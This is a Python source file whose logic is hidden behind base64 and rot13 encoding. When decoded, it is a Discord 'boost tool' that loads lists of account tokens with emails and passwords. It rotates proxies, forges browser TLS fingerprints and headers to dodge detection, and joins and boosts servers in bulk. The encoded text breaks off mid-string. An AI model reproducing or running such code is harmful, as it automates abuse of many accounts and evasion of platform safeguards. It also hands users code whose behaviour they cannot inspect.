# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'ZnJvbSBjb2xvcmFtYSBpbXBvcnQgU3R5bGUNCmltcG9ydCBkaXNjb3JkLCBkYXRldGltZSwgdGltZSwgcmVxdWVzdHMsIGpzb24sIHRocmVhZGluZywgb3MsIHJhbmRvbSwgaHR0cHgsIHN5cw0KaW1wb3J0IHRsc19jbGllbnQNCmZyb20gcGF0aGxpYiBpbXBvcnQgUGF0aA0KZnJvbSB0aHJlYWRpbmcgaW1wb3J0IFRocmVhZA0KaW1wb3J0IGhhc2hsaWINCg0KY29uZmlnID0ganNvbi5sb2FkKG9wZW4oImNvbmZpZy5qc29uIiwgZW5jb2Rpbmc9InV0Zi04IikpIA0KDQoNCmNsYXNzIEZvcmU6DQogICAgQkxBQ0sgID0gJ1wwMzNbMzBtJw0KICAgIFJFRCAgICA9ICdcMDMzWzMxbScNCiAgICBHUkVFTiAgPSAnXDAzM1szMm0nDQogICAgWUVMTE9XID0gJ1wwMzNbMzNtJw0KICAgIEJMVUUgICA9ICdcMDMzWzM0bScNCiAgICBNQUdFTlRBID0gJ1wwMzNbMzVtJw0KICAgIENZQU4gICA9ICdcMDMzWzM2bScNCiAgICBXSElURSAgPSAnXDAzM1szN20nDQogICAgVU5ERVJMSU5FID0gJ1wwMzNbNG0nDQogICAgUkVTRVQgID0gJ1wwMzNbMG0nDQogICAgDQpvcy5zeXN0ZW0oZiJ0aXRsZSBib29zdCB0b29sIGJ5IGRpc2NvcmQuZ2cvOWNsb3VkIGJ5IFNhZzNhdGEjMDAwMSIpICAgIA0KZmluZ2VycHJpbnRzID0ganNvbi5sb2FkKG9wZW4oImZpbmdlcnByaW50cy5qc29uIiwgZW5jb2Rpbmc9InV0Zi04IikpDQoNCg0KY2xpZW50X2lkZW50aWZpZXJzID0gWydzYWZhcmlfaW9zXzE2XzAnLCAnc2FmYXJpX2lvc18xNV82JywgJ3NhZmFyaV9pb3NfMTVfNScsICdzYWZhcmlfMTZfMCcsICdzYWZhcmlfMTVfNl8xJywgJ3NhZmFyaV8xNV8zJywgJ29wZXJhXzkwJywgJ29wZXJhXzg5JywgJ2ZpcmVmb3hfMTA0JywgJ2ZpcmVmb3hfMTAyJ10NCg0KDQpjbGFzcyB2YXJpYWJsZXM6DQogICAgam9pbnMgPSAwOyBib29zdHNfZG9uZSA9IDA7IHN1Y2Nlc3NfdG9rZW5zID0gW107IGZhaWxlZF90b2tlbnMgPSBbXQ0KDQoNCg0KDQogDQpkZWYgY2hlY2tFbXB0eShmaWxlbmFtZSk6ICNjaGVja3MgaWYgdGhlIGZpbGUgcGFzc2VkIGlzIGVtcHR5IG9yIG5vdA0KICAgIG15cGF0aCA9IFBhdGgoZmlsZW5hbWUpDQogDQogICAgaWYgbXlwYXRoLnN0YXQoKS5zdF9zaXplID09IDA6DQogICAgICAgIHJldHVybiBUcnVlDQogICAgZWxzZToNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgDQogICAgDQpkZWYgdmFsaWRhdGVJbnZpdGUoaW52aXRlOnN0cik6ICNjaGVja3MgaWYgdGhlIGludml0ZSBwYXNzZWQgaXMgdmFsaWQgb3Igbm90DQogICAgY2xpZW50ID0gaHR0cHguQ2xpZW50KCkNCiAgICBpZiAndHlwZScgaW4gY2xpZW50LmdldChmJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YxMC9pbnZpdGVzL3tpbnZpdGV9P2lucHV0VmFsdWU9e2ludml0ZX0md2l0aF9jb3VudHM9dHJ1ZSZ3aXRoX2V4cGlyYXRpb249dHJ1ZScpLnRleHQ6DQogICAgICAgIHJldHVybiBUcnVlDQogICAgZWxzZToNCiAgICAgICAgcmV0dXJuIEZhbHNlIA0KDQoNCmRlZiBzcHJpbnQobWVzc2FnZSwgdHlwZSk6DQogICAgaWYgdHlwZSA9PSBUcnVlOg0KICAgICAgICBwcmludChmIntTdHlsZS5CUklHSFR9e0ZvcmUuTUFHRU5UQX1bK117U3R5bGUuQlJJR0hUfSB7bWVzc2FnZX17Rm9yZS5SRVNFVH17U3R5bGUuUkVTRVRfQUxMfSIpDQogICAgaWYgdHlwZSA9PSBGYWxzZToNCiAgICAgICAgcHJpbnQoZiJ7U3R5bGUuQlJJR0hUfXtGb3JlLk1BR0VOVEF9Wy1de1N0eWxlLkJSSUdIVH0ge21lc3NhZ2V9e0ZvcmUuUkVTRVR9e1N0eWxlLlJFU0VUX0FMTH0iKQ0KICAgIGlmIHR5cGUgPT0gImJsdWUiOg0KICAgICAgICBwcmludChmIntTdHlsZS5CUklHSFR9e0ZvcmUuTUFHRU5UQX17bWVzc2FnZX17Rm9yZS5SRVNFVH17U3R5bGUuUkVTRVRfQUxMfSIpICAgIA0KICAgICAgICANCg0KZGVmIGdldF9hbGxfdG9rZW5zKGZpbGVuYW1lOnN0cik6ICNyZXR1cm5zIGFsbCB0b2tlbnMgaW4gYSBmaWxlIGFzIHRva2VuIGZyb20gZW1haWw6cGFzc3dvcmQ6dG9rZW4NCiAgICBhbGxfdG9rZW5zID0gW10NCiAgICBmb3IgaiBpbiBvcGVuKGZpbGVuYW1lLCAiciIpLnJlYWQoKS5zcGxpdGxpbmVzKCk6DQogICAgICAgIGlmICI6IiBpbiBqOg0KICAgICAgICAgICAgaiA9IGouc3BsaXQoIjoiKVsyXQ0KICAgICAgICAgICAgYWxsX3Rva2Vucy5hcHBlbmQoaikNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGFsbF90b2tlbnMuYXBwZW5kKGopDQogDQogICAgcmV0dXJuIGFsbF90b2tlbnMNCg0KDQoNCmRlZiByZW1vdmUodG9rZW46IHN0ciwgZmlsZW5hbWU6c3RyKToNCiAgICB0b2tlbnMgPSBnZXRfYWxsX3Rva2VucyhmaWxlbmFtZSkNCiAgICB0b2tlbnMucG9wKHRva2Vucy5pbmRleCh0b2tlbikpDQogICAgZiA9IG9wZW4oZmlsZW5hbWUsICJ3IikNCiAgICANCiAgICBmb3IgbCBpbiB0b2tlbnM6DQogICAgICAgIGYud3JpdGUoZiJ7bH1cbiIpDQogICAgICAgIA0KICAgIGYuY2xvc2UoKQ0KICAgICAgICAgICAgDQogICAgICAgIA0KICAgICAgICANCiNnZXQgcHJveHkNCmRlZiBnZXRwcm94eSgpOg0KICAgIHRyeToNCiAgICAgICAgcHJveHkgPSByYW5kb20uY2hvaWNlKG9wZW4oImlucHV0L3Byb3hpZXMudHh0IiwgInIiKS5yZWFkKCkuc3BsaXRsaW5lcygpKQ0KICAgICAgICByZXR1cm4geydodHRwJzogZidodHRwOi8ve3Byb3h5fSd9DQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAjc3ByaW50KGYie3N0cihlKS5jYXBpdGFsaXplKCl9IHwgRnVuY3Rpb246IEdldFByb3h5LCBSZXRyeWluZyIsIEZhbHNlKQ0KICAgICAgICBwYXNzDQogICAgDQogICAgDQpkZWYgZ2V0X2ZpbmdlcnByaW50KHRocmVhZCk6DQogICAgdHJ5Og0KICAgICAgICBmaW5nZXJwcmludCA9IGh0dHB4LmdldChmImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YxMC9leHBlcmltZW50cyIsIHByb3hpZXMgPSAgeydodHRwOi8vJzogZidodHRwOi8ve3JhbmRvbS5jaG9pY2Uob3BlbigiaW5wdXQvcHJveGllcy50eHQiLCAiciIpLnJlYWQoKS5zcGxpdGxpbmVzKCkpfScsICdodHRwczovLyc6IGYnaHR0cDovL3tyYW5kb20uY2hvaWNlKG9wZW4oImlucHV0L3Byb3hpZXMudHh0IiwgInIiKS5yZWFkKCkuc3BsaXRsaW5lcygpKX0nfSBpZiBjb25maWdbJ3Byb3h5bGVzcyddICE9IFRydWUgZWxzZSBOb25lKQ0KICAgICAgICByZXR1cm4gZmluZ2VycHJpbnQuanNvbigpWydmaW5nZXJwcmludCddDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAjc3ByaW50KGYiW3t0aHJlYWR9XSB7c3RyKGUpLmNhcGl0YWxpemUoKX0gfCBGdW5jdGlvbjogR2V0X0ZpbmdlcnByaW50LCBSZXRyeWluZyIsIEZhbHNlKQ0KICAgICAgICBnZXRfZmluZ2VycHJpbnQodGhyZWFkKQ0KDQoNCmRlZiBnZXRfY29va2llcyh4LCB1c2VyYWdlbnQsIHRocmVhZCk6DQogICAgdHJ5Og0KICAgICAgICByZXNwb25zZSA9IGh0dHB4LmdldCgnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjEwL2V4cGVyaW1lbnRzJywgaGVhZGVycyA9IHsnYWNjZXB0JzogJyovKicsJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlLCBicicsJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOScsJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywnb3JpZ2luJzogJ2h0dHBzOi8vZGlzY29yZC5jb20nLCdyZWZlcmVyJzonaHR0cHM6Ly9kaXNjb3JkLmNvbScsJ3NlYy1jaC11YSc6IGYnIkdvb2dsZSBDaHJvbWUiO3Y9IjEwOCIsICJDaHJvbWl1bSI7dj0iMTA4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IicsJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzAnLCdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnIldpbmRvd3MiJywnc2VjLWZldGNoLWRlc3QnOiAnZW1wdHknLCdzZWMtZmV0Y2gtbW9kZSc6ICdjb3JzJywnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLCd1c2VyLWFnZW50JzogdXNlcmFnZW50LCAneC1kZWJ1Zy1vcHRpb25zJzogJ2J1Z1JlcG9ydGVyRW5hYmxlZCcsJ3gtZGlzY29yZC1sb2NhbGUnOiAnZW4tVVMnLCd4LXN1cGVyLXByb3BlcnRpZXMnOiB4fSwgcHJveGllcyA9IHsnaHR0cDovLyc6IGYnaHR0cDovL3tyYW5kb20uY2hvaWNlKG9wZW4oImlucHV0L3Byb3hpZXMudHh0IiwgInIiKS5yZWFkKCkuc3BsaXRsaW5lcygpKX0nLCAnaHR0cHM6Ly8nOiBmJ2h0dHA6Ly97cmFuZG9tLmNob2ljZShvcGVuKCJpbnB1dC9wcm94aWVzLnR4dCIsICJyIikucmVhZCgpLnNwbGl0bGluZXMoKSl9J30gaWYgY29uZmlnWydwcm94eWxlc3MnXSAhPSBUcnVlIGVsc2UgTm9uZSkNCiAgICAgICAgY29va2llID0gZiJsb2NhbGU9ZW47IF9fZGNmZHVpZD17cmVzcG9uc2UuY29va2llcy5nZXQoJ19fZGNmZHVpZCcpfTsgX19zZGNmZHVpZD17cmVzcG9uc2UuY29va2llcy5nZXQoJ19fc2RjZmR1aWQnKX07IF9fY2ZydWlkPXtyZXNwb25zZS5jb29raWVzLmdldCgnX19jZnJ1aWQnKX0iDQogICAgICAgIHJldHVybiBjb29raWUNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICNzcHJpbnQoZiJbe3RocmVhZH1dIHtzdHIoZSkuY2FwaXRhbGl6ZSgpfSB8IEZ1bmN0aW9uOiBHZXRfQ29va2llcywgUmV0cnlpbmciLCBGYWxzZSkNCiAgICAgICAgZ2V0X2Nvb2tpZXMoeCwgdXNlcmFnZW50LCB0aHJlYWQpDQoNCg0KI2dldCBoZWFkZXJzDQpkZWYgZ2V0X2hlYWRlcnModG9rZW4sdGhyZWFkKToNCiAgICB4ID0gZmluZ2VycHJpbnRzW3JhbmRvbS5yYW5kaW50KDAsIChsZW4oZmluZ2VycHJpbnRzKS0xKSldWyd4LXN1cGVyLXByb3BlcnRpZXMnXQ0KICAgIHVzZXJhZ2VudCA9IGZpbmdlcnByaW50c1tyYW5kb20ucmFuZGludCgwLCAobGVuKGZpbmdlcnByaW50cyktMSkpXVsndXNlcmFnZW50J10NCiAgICBoZWFkZXJzID0gew0KICAgICAgICAnYWNjZXB0JzogJyovKicsDQogICAgICAgICdhY2NlcHQtZW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZSwgYnInLA0KICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45JywNCiAgICAgICAgJ2F1dGhvcml6YXRpb24nOiB0b2tlbiwNCiAgICAgICAgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywNCiAgICAgICAgJ29yaWdpbic6ICdodHRwczovL2Rpc2NvcmQuY29tJywNCiAgICAgICAgJ3JlZmVyZXInOidodHRwczovL2Rpc2NvcmQuY29tJywNCiAgICAgICAgJ3NlYy1jaC11YSc6'
love = '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'
god = 'IHwgRnVuY3Rpb246IFB1dF9Cb29zdCwgUmV0cnlpbmciLCBGYWxzZSkNCiAgICAgICAgcHV0X2Jvb3N0KHNlc3Npb24sIGhlYWRlcnMsIGd1aWxkX2lkLCBib29zdF9pZCkNCiAgICANCiAgICANCmRlZiBjaGFuZ2VfZ3VpbGRfbmFtZShzZXNzaW9uLCBoZWFkZXJzLCBzZXJ2ZXJfaWQsIG5pY2spOg0KICAgIHRyeToNCiAgICAgICAganNvblBheWxvYWQgPSB7Im5pY2siOiBuaWNrfQ0KICAgICAgICByID0gc2Vzc2lvbi5wYXRjaChmImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L2d1aWxkcy97c2VydmVyX2lkfS9tZW1iZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycywganNvbj1qc29uUGF5bG9hZCkNCiAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgICAgIA0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgI3NwcmludChmIlt7dGhyZWFkfV0ge3N0cihlKS5jYXBpdGFsaXplKCl9IHwgRnVuY3Rpb246IENoYW5nZV9HdWlsZF9OYW1lLCBSZXRyeWluZyIsIEZhbHNlKQ0KICAgICAgICBjaGFuZ2VfZ3VpbGRfbmFtZShzZXNzaW9uLCBoZWFkZXJzLCBzZXJ2ZXJfaWQsIG5pY2spDQogICAgDQogICAgDQojYm9vc3Qgc2VydmVyDQpkZWYgYm9vc3Rfc2VydmVyKGludml0ZTpzdHIgLCBtb250aHM6aW50LCB0b2tlbjpzdHIsIHRocmVhZDppbnQsIG5pY2s6IHN0cik6DQogICAgaWYgbW9udGhzID09IDE6DQogICAgICAgIGZpbGVuYW1lID0gImlucHV0LzFtX3Rva2Vucy50eHQiDQogICAgaWYgbW9udGhzID09IDM6DQogICAgICAgIGZpbGVuYW1lID0gImlucHV0LzNtX3Rva2Vucy50eHQiDQogICAgDQogICAgdHJ5Og0KICAgICAgICBzZXNzaW9uID0gdGxzX2NsaWVudC5TZXNzaW9uKGphM19zdHJpbmcgPSBmaW5nZXJwcmludHNbcmFuZG9tLnJhbmRpbnQoMCwgKGxlbihmaW5nZXJwcmludHMpLTEpKV1bJ2phMyddLCBjbGllbnRfaWRlbnRpZmllciA9IHJhbmRvbS5jaG9pY2UoY2xpZW50X2lkZW50aWZpZXJzKSkNCiAgICAgICAgaWYgY29uZmlnWydwcm94eWxlc3MnXSA9PSBGYWxzZSBhbmQgbGVuKG9wZW4oImlucHV0L3Byb3hpZXMudHh0IiwgInIiKS5yZWFkbGluZXMoKSkgIT0gMDoNCiAgICAgICAgICAgIHByb3h5ID0gZ2V0cHJveHkoKQ0KICAgICAgICAgICAgc2Vzc2lvbi5wcm94aWVzLnVwZGF0ZShwcm94eSkNCg0KICAgICAgICBoZWFkZXJzLCB1c2VyYWdlbnQgPSBnZXRfaGVhZGVycyh0b2tlbiwgdGhyZWFkKQ0KICAgICAgICBib29zdF9kYXRhID0gc2Vzc2lvbi5nZXQoZiJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvZ3VpbGRzL3ByZW1pdW0vc3Vic2NyaXB0aW9uLXNsb3RzIiwgaGVhZGVycz1oZWFkZXJzKQ0KDQogICAgICAgIGlmICI0MDE6IFVuYXV0aG9yaXplZCIgaW4gYm9vc3RfZGF0YS50ZXh0Og0KICAgICAgICAgICAgc3ByaW50KGYiW3t0aHJlYWR9XSBJTlZBTEl